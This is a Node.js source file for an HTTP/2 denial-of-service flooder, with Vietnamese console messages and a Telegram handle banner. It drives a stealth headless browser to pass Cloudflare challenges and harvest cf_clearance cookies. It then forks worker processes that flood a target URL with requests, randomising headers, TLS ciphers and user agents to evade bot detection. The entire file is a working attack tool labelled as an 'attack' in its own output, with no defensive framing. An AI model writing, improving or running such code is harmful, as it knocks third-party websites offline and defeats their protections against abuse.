const { connect } = require("puppeteer-real-browser");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const os = require("os");

const methodss = ["GET", "POST", "PUT", "OPTIONS", "HEAD", "DELETE", "TRACE", "CONNECT", "PATCH"];
const dfcp = crypto.constants.defaultCoreCipherList.split(":");
const cipher = [
   "TLS_AES_128_GCM_SHA256",
      "TLS_AES_256_GCM_SHA384",
      "TLS_CHACHA20_POLY1305_SHA256",
      dfcp[0],
       dfcp[1],
        dfcp[2],
         dfcp[3],
          ...dfcp.slice(3),
].join(":");
const sigalgs = [
    "ecdsa_secp256r1_sha256",
    "rsa_pss_rsae_sha256",
    "rsa_pkcs1_sha256",
    "ecdsa_secp384r1_sha384",
    "rsa_pss_rsae_sha384",
    "rsa_pkcs1_sha384",
    "rsa_pss_rsae_sha512",
    "rsa_pkcs1_sha512"
];

const cplist = [
  'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
  'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
  'AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL',
  'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5',
  'HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS',
  'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK'
];

const accept_header = [
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'
];

const cache_header = [
  'max-age=0',
  'no-cache',
  'no-store', 
  'pre-check=0',
  'post-check=0',
  'must-revalidate',
  'proxy-revalidate',
  's-maxage=604800',
  'no-cache, no-store,private, max-age=0, must-revalidate',
  'no-cache, no-store,private, s-maxage=604800, must-revalidate',
  'no-cache, no-store,private, max-age=604800, must-revalidate',
];

function getRandomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

const uap = [
    `Mozilla/5.0 (Windows NT ${getRandomInt(1, 11)}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${getRandomInt(120, 130)}.0.0.0 Safari/537.36`,
    `Mozilla/5.0 (Macintosh; Intel Mac OS X 10_${getRandomInt(10, 18)}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${getRandomInt(120, 130)}.0.0.0 Safari/537.36`,
    `Mozilla/5.0 (Linux; Android ${getRandomInt(4, 14)}; Mobile) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${getRandomInt(120, 130)}.0.0.0 Mobile Safari/537.36`,
    `Mozilla/5.0 (Linux; Android ${getRandomInt(4, 14)}; Tablet) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${getRandomInt(120, 130)}.0.0.0 Safari/537.36`,
    `Mozilla/5.0 (iPhone; CPU iPhone OS ${getRandomInt(10, 17)}_${getRandomInt(0, 4)} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${getRandomInt(10, 17)}.0 Mobile/15E148 Safari/604.1`,
    `Mozilla/5.0 (iPad; CPU OS ${getRandomInt(10, 17)}_${getRandomInt(0, 7)} like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/${getRandomInt(10, 17)}.0 Mobile/15E148 Safari/604.1`
];

const encoding = [
    'gzip', 'br', 'deflate', 'zstd', 'identity', 'compress', 'x-bzip2', 'x-gzip',
    'lz4', 'lzma', 'xz', 'zlib',
    'gzip, br', 'gzip, deflate', 'gzip, zstd', 'gzip, lz4', 'gzip, lzma',
    'gzip, xz', 'gzip, zlib', 'br, deflate', 'br, zstd', 'br, lz4',
    'br, lzma', 'br, xz', 'br, zlib', 'deflate, zstd', 'deflate, lz4',
    'deflate, lzma', 'deflate, xz', 'deflate, zlib', 'zstd, lz4',
    'zstd, lzma', 'zstd, xz', 'zstd, zlib', 'lz4, lzma', 'lz4, xz',
    'lz4, zlib', 'lzma, xz', 'lzma, zlib', 'xz, zlib',
    'gzip, br, deflate', 'gzip, br, zstd', 'gzip, br, lz4', 'gzip, br, lzma',
    'gzip, br, xz', 'gzip, br, zlib', 'gzip, deflate, zstd', 'gzip, deflate, lz4',
    'gzip, deflate, lzma', 'gzip, deflate, xz', 'gzip, deflate, zlib', 'gzip, zstd, lz4',
    'gzip, zstd, lzma', 'gzip, zstd, xz', 'gzip, zstd, zlib', 'gzip, lz4, lzma',
    'gzip, lz4, xz', 'gzip, lz4, zlib', 'gzip, lzma, xz', 'gzip, lzma, zlib',
    'gzip, xz, zlib', 'br, deflate, zstd', 'br, deflate, lz4', 'br, deflate, lzma',
    'br, deflate, xz', 'br, deflate, zlib', 'br, zstd, lz4', 'br, zstd, lzma',
    'br, zstd, xz', 'br, zstd, zlib', 'br, lz4, lzma', 'br, lz4, xz',
    'br, lz4, zlib', 'br, lzma, xz', 'br, lzma, zlib', 'br, xz, zlib',
    'deflate, zstd, lz4', 'deflate, zstd, lzma', 'deflate, zstd, xz', 'deflate, zstd, zlib',
    'deflate, lz4, lzma', 'deflate, lz4, xz', 'deflate, lz4, zlib', 'deflate, lzma, xz',
    'deflate, lzma, zlib', 'deflate, xz, zlib', 'zstd, lz4, lzma', 'zstd, lz4, xz',
    'zstd, lz4, zlib', 'zstd, lzma, xz', 'zstd, lzma, zlib', 'zstd, xz, zlib',
    'lz4, lzma, xz', 'lz4, lzma, zlib', 'lz4, xz, zlib', 'lzma, xz, zlib',
    'gzip, br, deflate, zstd', 'gzip, br, deflate, lz4', 'gzip, br, deflate, lzma',
    'gzip, br, deflate, xz', 'gzip, br, deflate, zlib', 'gzip, br, zstd, lz4',
    'gzip, br, zstd, lzma', 'gzip, br, zstd, xz', 'gzip, br, zstd, zlib',
    'gzip, br, lz4, lzma', 'gzip, br, lz4, xz', 'gzip, br, lz4, zlib',
    'gzip, br, lzma, xz', 'gzip, br, lzma, zlib', 'gzip, br, xz, zlib',
    'gzip, deflate, zstd, lz4', 'gzip, deflate, zstd, lzma', 'gzip, deflate, zstd, xz',
    'gzip, deflate, zstd, zlib', 'gzip, deflate, lz4, lzma', 'gzip, deflate, lz4, xz',
    'gzip, deflate, lz4, zlib', 'gzip, deflate, lzma, xz', 'gzip, deflate, lzma, zlib',
    'gzip, deflate, xz, zlib', 'gzip, zstd, lz4, lzma', 'gzip, zstd, lz4, xz',
    'gzip, zstd, lzma, xz', 'gzip, zstd, lzma, zlib', 'gzip, zstd, xz, zlib',
    'gzip, lz4, lzma, xz', 'gzip, lz4, lzma, zlib', 'gzip, lz4, xz, zlib',
    'gzip, lzma, xz, zlib', 'br, deflate, zstd, lz4', 'br, deflate, zstd, lzma',
    'br, deflate, zstd, xz', 'br, deflate, zstd, zlib', 'br, deflate, lz4, lzma',
    'br, deflate, lz4, xz', 'br, deflate, lz4, zlib', 'br, deflate, lzma, xz',
    'br, deflate, lzma, zlib', 'br, deflate, xz, zlib', 'br, zstd, lz4, lzma',
    'br, zstd, lz4, xz', 'br, zstd, lzma, xz', 'br, zstd, lzma, zlib',
    'br, zstd, xz, zlib', 'br, lz4, lzma, xz', 'br, lz4, lzma, zlib',
    'br, lz4, xz, zlib', 'br, lzma, xz, zlib', 'deflate, zstd, lz4, lzma',
    'deflate, zstd, lz4, xz', 'deflate, zstd, lzma, xz', 'deflate, zstd, lzma, zlib',
    'deflate, zstd, xz, zlib', 'deflate, lz4, lzma, xz', 'deflate, lz4, lzma, zlib',
    'deflate, lz4, xz, zlib', 'deflate, lzma, xz, zlib', 'zstd, lz4, lzma, xz',
    'zstd, lz4, lzma, zlib', 'zstd, lz4, xz, zlib', 'zstd, lzma, xz, zlib',
    'lz4, lzma, xz, zlib'
];

const ignoreNames = ['RequestError', 'StatusCodeError', 'CaptchaError', 'CloudflareError', 'ParseError', 'ParserError', 'TimeoutError', 'JSONError', 'URLError', 'InvalidURL', 'ProxyError'];
const ignoreCodes = ['SELF_SIGNED_CERT_IN_CHAIN', 'ECONNRESET', 'ERR_ASSERTION', 'ECONNREFUSED', 'EPIPE', 'EHOSTUNREACH', 'ETIMEDOUT', 'ESOCKETTIMEDOUT', 'EPROTO', 'EAI_AGAIN', 'EHOSTDOWN', 'ENETRESET', 'ENETUNREACH', 'ENONET', 'ENOTCONN', 'ENOTFOUND', 'EAI_NODATA', 'EAI_NONAME', 'EADDRNOTAVAIL', 'EAFNOSUPPORT', 'EALREADY', 'EBADF', 'ECONNABORTED', 'EDESTADDRREQ', 'EDQUOT', 'EFAULT', 'EHOSTUNREACH', 'EIDRM', 'EILSEQ', 'EINPROGRESS', 'EINTR', 'EINVAL', 'EIO', 'EISCONN', 'EMFILE', 'EMLINK', 'EMSGSIZE', 'ENAMETOOLONG', 'ENETDOWN', 'ENOBUFS', 'ENODEV', 'ENOENT', 'ENOMEM', 'ENOPROTOOPT', 'ENOSPC', 'ENOSYS', 'ENOTDIR', 'ENOTEMPTY', 'ENOTSOCK', 'EOPNOTSUPP', 'EPERM', 'EPIPE', 'EPROTONOSUPPORT', 'ERANGE', 'EROFS', 'ESHUTDOWN', 'ESPIPE', 'ESRCH', 'ETIME', 'ETXTBSY', 'EXDEV', 'UNKNOWN', 'DEPTH_ZERO_SELF_SIGNED_CERT', 'UNABLE_TO_VERIFY_LEAF_SIGNATURE', 'CERT_HAS_EXPIRED', 'CERT_NOT_YET_VALID'];

const headerFunc = {
    cipher() {
        return cplist[Math.floor(Math.random() * cplist.length)];
    },
    sigalgs() {
        return sigalgs[Math.floor(Math.random() * sigalgs.length)];
    },
    accept() {
        return accept_header[Math.floor(Math.random() * accept_header.length)];
    },
    cache() {
        return cache_header[Math.floor(Math.random() * cache_header.length)];
    },
    encoding() {
        return encoding[Math.floor(Math.random() * encoding.length)];
    }
};

process.on('uncaughtException', function(e) {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
}).on('unhandledRejection', function(e) {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
}).on('warning', e => {
    if (e.code && ignoreCodes.includes(e.code) || e.name && ignoreNames.includes(e.name)) return false;
}).setMaxListeners(0);

let randbyte = 1;
setInterval(()=>{
 randbyte = Math.floor(Math.random() * 5) + 1;
},5000);

if (process.argv.length < 6) {
    console.log("\x1b[31m❌ Cách sử dụng: node uam.js <target> <time> <rate> <threads> <cookieCount>\x1b[0m");
    console.log("\x1b[33mVí dụ: node uam.js https://example.com 60 5 4 6\x1b[0m");
    process.exit(1);
}

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    Rate: parseInt(process.argv[4]),
    threads: parseInt(process.argv[5]),
    cookieCount: parseInt(process.argv[6]) || 2
};

try {
    const parsedUrl = new URL(args.target);
    if (!['http:', 'https:'].includes(parsedUrl.protocol)) {
        throw new Error("URL không hợp lệ. Chỉ chấp nhận http:// hoặc https://");
    }
} catch (e) {
    console.log(`\x1b[31m❌ Lỗi URL: ${e.message}\x1b[0m`);
    console.log("\x1b[31m❌ Cách sử dụng: node uam.js <target> <time> <rate> <threads> <cookieCount>\x1b[0m");
    console.log("\x1b[33mVí dụ: node uam.js https://example.com 60 5 4 6\x1b[0m");
    process.exit(1);
}

const parsedTarget = url.parse(args.target);

global.http2ClientPool = [];
global.maxHttp2Clients = 10;

let statusCountsMaster = {};

function countStatus(status) {
  if (!statusCountsMaster[status]) {
    statusCountsMaster[status] = 0;
  }
  statusCountsMaster[status]++;
}

function printStatusCounts() {
  console.log(statusCountsMaster);
  Object.keys(statusCountsMaster).forEach(status => {
    statusCountsMaster[status] = 0;
  });
}

function maskString(proxy) {
  let [ip, port] = proxy.split(':');
  let segments = ip.split('.');
  segments[segments.length - 1] = '*'.repeat(segments[segments.length - 1].length);
  segments[segments.length - 2] = '*'.repeat(segments[segments.length - 2].length);
  port = '*'.repeat(port.length);
  let maskedIp = segments.join('.');
  return `${maskedIp}:${port}`;
}

function flood(userAgent, cookie) {
    try {
        let parsed = url.parse(args.target);
        let path = parsed.path;

        function randomDelay(min, max) {
            return Math.floor(Math.random() * (max - min + 1)) + min;
        }
        let interval = randomDelay(100, 1000);

        function getChromeVersion(userAgent) {
            const chromeVersionRegex = /Chrome\/([\d.]+)/;
            const match = userAgent.match(chromeVersionRegex);
            if (match && match[1]) {
                return match[1];
            }
            return null;
        }

        const chromever = getChromeVersion(userAgent) || "126";
        const randValue = list => list[Math.floor(Math.random() * list.length)];
        
        let nodeii = getRandomInt(128, 129);

        let chead = {};
        chead["cookie"] = cookie;

        let header = {
            "upgrade-insecure-requests": "1",
            "sec-fetch-mode": "navigate",
            "sec-fetch-dest": "document",
            ...chead,
            "cache-control": headerFunc.cache(),
            "sec-ch-ua": `\"Chromium\";v=\"${nodeii}\", \"Not=A?Brand\";v=\"${0}\", \"Google Chrome\";v=\"${nodeii}\"`,
            "sec-ch-ua-platform": "Linux-x86",
            ...shuffleObject({
                "sec-ch-ua-mobile": "?0",
                "sec-fetch-user": "?1",
                "accept": headerFunc.accept(),
            }),
            'user-agent': userAgent,
            "accept-language": "en-US,en;q=0.9,vi;q=0.8",
            "accept-encoding": headerFunc.encoding(),
            "purpure-secretf-id": "formula-" + generateRandomString(1, 5),
            "priority": `u=${randbyte}, i`,
            "sec-fetch-site": "none",
        };

        if (Math.random() >= 0.5) {
            header = {
                ...header,
                ...(Math.random() < 0.6 ? {
                    ["rush-combo"]: "zero-" + generateRandomString(1, 5)
                } : {}),
                ...(Math.random() < 0.6 ? {
                    ["rush-xjava"]: "router-" + generateRandomString(1, 5)
                } : {}),
                ...(Math.random() < 0.6 ? {
                    ["rush-combo-javax"]: "zero-" + generateRandomString(1, 5)
                } : {}),
                ...(Math.random() < 0.6 ? {
                    ["c-xjava" + generateRandomString(1, 2)]: "router-" + generateRandomString(1, 5)
                } : {})
            };
        }

        if (Math.random() >= 0.5) {
            header = {
                ...header,
                ...(Math.random() < 0.5 ? {
                    ["c-xjava-xjs" + generateRandomString(1, 2)]: "router-" + generateRandomString(1, 5)
                } : {}),
                ...(Math.random() < 0.5 ? {
                    "blum-purpose": "0"
                } : {}),
                ...(Math.random() < 0.5 ? {
                    "blum-point": "0"
                } : {})
            };
        }

        if (Math.random() >= 0.5) {
            header = {
                ...header,
                ...(Math.random() < 0.6 ? { 
                    [generateRandomString(1, 2) + generateRandomString(1, 2)]: "zero-" + generateRandomString(1, 2) 
                } : {}),
                ...(Math.random() < 0.6 ? { 
                    [generateRandomString(1, 2) + generateRandomString(1, 2)]: "router-" + generateRandomString(1, 2) 
                } : {})
            };
        }

        const datafloor = Math.floor(Math.random() * 3);
        let mathfloor;
        let rada;
        switch (datafloor) {
            case 0:
                mathfloor = 6291456 + 65535;
                rada = 128;
                break;
            case 1:
                mathfloor = 6291456 - 65535;
                rada = 256;
                break;
            case 2:
                mathfloor = 6291456 + 65535*4 ;
                rada = 1;
                break;
        }

        const TLSOPTION = {
            ciphers: headerFunc.cipher(),
            sigalgs: headerFunc.sigalgs(),
            minVersion: "TLSv1.3",
            ecdhCurve: 'secp256r1:X25519',
            secure: true,
            rejectUnauthorized: false,
            ALPNProtocols: ['h3', 'h2', 'http/1.1', 'h1', 'spdy/3.1', 'http/2+quic/43', 'http/2+quic/44', 'http/2+quic/45'],
            requestOCSP: true,
            minDHSize: 2048
        };

        let client;
        let tlsSocket;

        if (global.http2ClientPool.length > 0) {
            client = global.http2ClientPool.pop();
            tlsSocket = client._tlsSocket;
        } else {
            tlsSocket = tls.connect({
                ...TLSOPTION,
                host: parsed.host,
                port: 443,
                servername: parsed.host,
            });
            tlsSocket.setKeepAlive(true, 600000 * 1000);

            client = http2.connect(parsed.href, {
                createConnection: () => tlsSocket,
                protocol: "https:",
                settings: {
                    headerTableSize: 65536,
                    initialWindowSize: mathfloor,
                    maxHeaderListSize: 262144,
                    enablePush:  true ,
                    enableConnectProtocol :false,
                    enableOrigin : true ,
                    enableH2cUpgrade :true,
                    allowHTTP1 : true ,
                    ...(Math.random() < 0.5 ? {
                       maxConcurrentStreams: 100
                      } : {}),
                }
            }, (session) => {
                session.setLocalWindowSize(mathfloor);
            });

            client._tlsSocket = tlsSocket;
        }

        client.on("connect", () => {
            let clearr = setInterval(async () => {
                for (let i = 0; i < args.Rate; i++) {
                    let author = {
                        ":method": "GET",
                        ":authority": parsed.host,
                        ":scheme": "https",
                        ":path": path,
                    };

                    const request = client.request({ ...author, ...header }, {
                        weight: rada,
                        parent: 0,
                        exclusive: false
                    });

                    request.on("response", (res) => {
                        countStatus(res[":status"]);
                        global.successRequests = (global.successRequests || 0) + 1;
                        global.totalRequests = (global.totalRequests || 0) + 1;
                        if (res[":status"] === 429) {
                            clearInterval(clearr);
                            client.destroy();
                            tlsSocket.destroy();
                        }
                    });
                    request.end();
                }
            }, interval);

            client.on("goaway", (errorCode, lastStreamID, opaqueData) => {
                clearInterval(clearr);
                client.destroy();
                tlsSocket.destroy();
            });

            client.on("close", () => {
                clearInterval(clearr);
                client.destroy();
                tlsSocket.destroy();
            });

            client.on("error", (error) => {
                clearInterval(clearr);
                client.destroy();
                tlsSocket.destroy();
            });
        });

        client.on("error", (error) => {
            client.destroy();
            tlsSocket.destroy();
        });
    } catch (err) {
        global.failedRequests = (global.failedRequests || 0) + 1;
    }
}

function randomElement(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
}

function randstr(length) {
    const chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    for (let i = 0; i < length; i++) {
        result += chars[Math.floor(Math.random() * chars.length)];
    }
    return result;
}

function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    const randomStringArray = Array.from({ length }, () => {
        const randomIndex = Math.floor(Math.random() * characters.length);
        return characters[randomIndex];
    });
    return randomStringArray.join('');
}

function shuffleObject(obj) {
    const keys = Object.keys(obj);
    const shuffledKeys = keys.reduce((acc, _, index, array) => {
        const randomIndex = Math.floor(Math.random() * (index + 1));
        acc[index] = acc[randomIndex];
        acc[randomIndex] = keys[index];
        return acc;
    }, []);
    const shuffledObject = Object.fromEntries(shuffledKeys.map((key) => [key, obj[key]]));
    return shuffledObject;
}

async function bypassCloudflareOnce(browser, attemptNum) {
    const startTime = performance.now();
    let page = null;
    let title = "Không xác định";
    let userAgent = "Không xác định";
    let cookieString = "Không tìm thấy cf_clearance";

    try {
        page = await browser.newPage();
        await page.evaluateOnNewDocument(() => {
            Object.defineProperty(navigator, 'webdriver', {
                get: () => undefined
            });
        });
        
        await page.goto(args.target, { 
            waitUntil: 'domcontentloaded',
            timeout: 60000 
        });
        
        title = await page.title();
        
        let challengeCompleted = false;
        let checkCount = 0;
        const maxChecks = 60;
        
        while (!challengeCompleted && checkCount < maxChecks) {
            await new Promise(r => setTimeout(r, 1000));
            
            try {
                const cookies = await page.cookies();
                const cfClearance = cookies.find(c => c.name === "cf_clearance");
                
                if (cfClearance) {
                    challengeCompleted = true;
                    cookieString = cfClearance.name + "=" + cfClearance.value;
                    break;
                }
                
                challengeCompleted = await page.evaluate(() => {
                    const title = (document.title || "").toLowerCase();
                    const bodyText = (document.body?.innerText || "").toLowerCase();
                    
                    if (title.includes("just a moment") || 
                        title.includes("checking") ||
                        bodyText.includes("checking your browser") ||
                        bodyText.includes("please wait") ||
                        bodyText.includes("cloudflare")) {
                        return false;
                    }
                    
                    return document.body && document.body.children.length > 3;
                });
                
            } catch (evalError) {
            }
            
            checkCount++;
        }
        
        await new Promise(r => setTimeout(r, 2000));
        
        const cookies = await page.cookies();
        const cfClearance = cookies.find(c => c.name === "cf_clearance");
        userAgent = await page.evaluate(() => navigator.userAgent);
        
        if (cfClearance) {
            cookieString = cfClearance.name + "=" + cfClearance.value;
        }
        
        await page.close();

        const executionTime = ((performance.now() - startTime) / 1000).toFixed(2);
        console.log("-----------------------------------------");
        console.log(`[Target URL]: ${args.target}`);
        console.log(`[Title]: ${title}`);
        console.log(`[Useragents solve]: ${userAgent}`);
        console.log(`[Cookie solve]: ${cookieString}`);
        console.log(`[Thoi gian solve xong]: ${executionTime} giay`);
        console.log("-----------------------------------------");
        
        return {
            cookies: cookies,
            userAgent: userAgent,
            cfClearance: cfClearance ? cfClearance.value : null,
            success: true,
            attemptNum: attemptNum
        };
        
    } catch (error) {
        const executionTime = ((performance.now() - startTime) / 1000).toFixed(2);
        console.error(`Lỗi trong quá trình xử lý bypass (Phiên ${attemptNum}): ${error.message}`);
        console.log("-----------------------------------------");
        console.log(`[Target URL]: ${args.target}`);
        console.log(`[Title]: ${title}`);
        console.log(`[Useragents solve]: ${userAgent}`);
        console.log(`[Cookie solve]: ${cookieString}`);
        console.log(`[Thoi gian solve xong]: ${executionTime} giay`);
        console.log("-----------------------------------------");

        if (page) await page.close();
        
        return {
            cookies: [],
            userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            cfClearance: null,
            success: false,
            attemptNum: attemptNum
        };
    }
}

async function bypassCloudflareParallel(totalCount) {
    const results = [];
    let attemptCount = 0;
    const concurrentBypassSessions = 10;
    
    const browserPool = [];
    for (let i = 0; i < concurrentBypassSessions; i++) {
        try {
            const response = await connect({
                headless: 'auto',
                args: [
                    '--no-sandbox',
                    '--disable-setuid-sandbox',
                    '--disable-dev-shm-usage',
                    '--disable-accelerated-2d-canvas',
                    '--no-first-run',
                    '--no-zygote',
                    '--disable-gpu',
                    '--window-size=1920,1080'
                ],
                turnstile: true,
                connectOption: {
                    defaultViewport: null
                }
            });
            browserPool.push(response.browser);
        } catch (e) {
            console.error(`\x1b[31m❌ Lỗi khi khởi tạo trình duyệt trong pool: ${e.message}\x1b[0m`);
        }
    }

    if (browserPool.length === 0) {
        console.error("\x1b[31m❌ Không thể khởi tạo bất kỳ trình duyệt nào. Không thể bypass Cloudflare.\x1b[0m");
        return [];
    }

    let currentBrowserIndex = 0;
    while (results.length < totalCount) {
        const batchPromises = [];
        const browsersInUse = [];

        for (let i = 0; i < concurrentBypassSessions && results.length + batchPromises.length < totalCount; i++) {
            const browserToUse = browserPool[currentBrowserIndex];
            if (browserToUse) {
                attemptCount++;
                batchPromises.push(bypassCloudflareOnce(browserToUse, attemptCount));
                browsersInUse.push(browserToUse);
                currentBrowserIndex = (currentBrowserIndex + 1) % browserPool.length;
            } else {
                break;
            }
        }

        if (batchPromises.length === 0) {
            break;
        }

        const batchResults = await Promise.all(batchPromises);

        for (const result of batchResults) {
            if (result.success && result.cookies.length > 0) {
                results.push(result);
            }
        }
        
        if (results.length < totalCount) {
            await new Promise(r => setTimeout(r, 5000));
        }
    }
    
    for (const browser of browserPool) {
        try {
            await browser.close();
        } catch (e) {}
    }
    
    if (results.length === 0) {
        results.push({
            cookies: [],
            userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
            cfClearance: null,
            success: true
        });
    }
    
    return results;
}

function runFlooder() {
    const bypassInfo = randomElement(global.bypassData || []);
    if (!bypassInfo) return;

    const cookieString = bypassInfo.cookies ? bypassInfo.cookies.map(c => `${c.name}=${c.value}`).join("; ") : "";
    const userAgent = bypassInfo.userAgent || uap[Math.floor(Math.random() * uap.length)];
    
    flood(userAgent, cookieString);
}

global.totalRequests = 0;
global.successRequests = 0;
global.failedRequests = 0;
global.startTime = Date.now();
global.bypassData = [];

if (cluster.isMaster) {
    console.log(`
=====================================================
              t.me/NatSwagger
=====================================================
Target: ${args.target}
Threads: ${args.threads}
Duration: ${args.time}s
RPS: ${args.Rate}
Flood Duration: ${args.time}s
=====================================================
`);
    
    (async () => {
        const bypassResults = await bypassCloudflareParallel(args.cookieCount);
        
        global.bypassData = bypassResults;
        
        console.log(`\n\x1b[32m✅ Đã lấy thành công ${bypassResults.length} phiên!\x1b[0m`);
        console.log("\x1b[32m🚀 Bắt đầu tấn công...\x1b[0m\n");
        
        global.startTime = Date.now();
        
        for (let i = 0; i < args.threads; i++) {
            const worker = cluster.fork();
            worker.send({ 
                type: 'bypassData', 
                data: bypassResults 
            });
        }
        
        const statsInterval = setInterval(printStatusCounts, 3000);
        
        cluster.on('message', (worker, message) => {
            if (message.type === 'stats') {
                for (const status in message.statusCounts) {
                    if (!statusCountsMaster[status]) {
                        statusCountsMaster[status] = 0;
                    }
                    statusCountsMaster[status] += message.statusCounts[status];
                }
            }
        });
        
        cluster.on('exit', (worker) => {
            if (Date.now() - global.startTime < args.time * 1000) {
                const newWorker = cluster.fork();
                newWorker.send({ 
                    type: 'bypassData', 
                    data: bypassResults 
                });
            }
        });
        
        setTimeout(() => {
            clearInterval(statsInterval);
            console.log("\n\x1b[32m✅ Tấn công hoàn tất!\x1b[0m");
            process.exit(0);
        }, args.time * 1000);
    })();
    
} else {
    let workerBypassData = [];
    let attackInterval;
    
    global.totalRequests = 0;
    global.successRequests = 0;
    global.failedRequests = 0;
    const workerStatusCounts = {};

    process.on('message', (msg) => {
        if (msg.type === 'bypassData') {
            workerBypassData = msg.data;
            global.bypassData = msg.data;
            
            attackInterval = setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    runFlooder();
                }
            }, 1000);
            
            setInterval(() => {
                process.send({
                    type: 'stats',
                    total: global.totalRequests,
                    success: global.successRequests,
                    failed: global.totalRequests - global.successRequests,
                    statusCounts: workerStatusCounts
                });
                global.totalRequests = 0;
                global.successRequests = 0;
                global.failedRequests = 0;
                for (const status in workerStatusCounts) {
                    workerStatusCounts[status] = 0;
                }
            }, 1000);
        }
    });

    countStatus = (status) => {
        if (!workerStatusCounts[status]) {
            workerStatusCounts[status] = 0;
        }
        workerStatusCounts[status]++;
    };
    
    setTimeout(() => {
        if (attackInterval) clearInterval(attackInterval);
        process.exit(0);
    }, args.time * 1000);
}

process.on('uncaughtException', () => {});
process.on('unhandledRejection', () => {});
